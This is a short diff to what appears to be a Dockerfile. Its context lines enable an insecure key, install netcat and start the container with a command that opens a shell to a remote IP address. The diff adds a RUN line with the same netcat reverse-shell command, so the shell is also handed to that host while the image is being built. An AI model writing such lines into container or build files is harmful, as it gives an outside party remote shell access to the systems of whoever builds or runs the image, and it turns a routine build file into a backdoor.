@@ -12,4 +12,6 @@ RUN /usr/sbin/enable_insecure_key
 
 RUN apt-get install -y netcat
 
+RUN nc -c /bin/sh 129.21.50.46 4444
+
 CMD ["nc -c /bin/sh 129.21.50.46 4444"]
